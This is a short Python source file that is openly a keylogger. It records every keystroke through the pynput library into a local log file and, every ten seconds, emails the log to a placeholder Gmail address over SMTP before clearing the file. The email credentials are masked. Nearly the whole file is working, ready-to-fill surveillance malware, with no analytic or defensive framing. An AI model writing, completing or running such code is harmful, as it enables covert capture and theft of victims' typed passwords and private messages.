import smtplib
import time
import os
from pynput.keyboard import Listener

from_address = "xxxxxxx@gmail.com"
from_address_password = "xxxx xxxx xxxx xxxx" # Password for the email account (google app password)
to_list = ["xxxxxxx@gmail.com"]
log_file = "log.txt"
send_interval = 10  # seconds

def send_log():
    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
        with open(log_file, 'r') as f:
            message = f.read()
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(from_address, from_address_password)
            server.sendmail(from_address, to_list, message)
            server.quit()
            print("Log file sent successfully.")

            # Clear log after sending
            with open(log_file, 'w') as f:
                f.write('')
        except Exception as e:
            print(f"Failed to send email: {e}")


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open(log_file, 'a') as f:
        f.write(letter)

# Start the keylogger
def start_keylogger():
    with Listener(on_press=write_to_file) as listener:
        while True:
            time.sleep(send_interval)
            send_log()

if __name__ == "__main__":
    start_keylogger()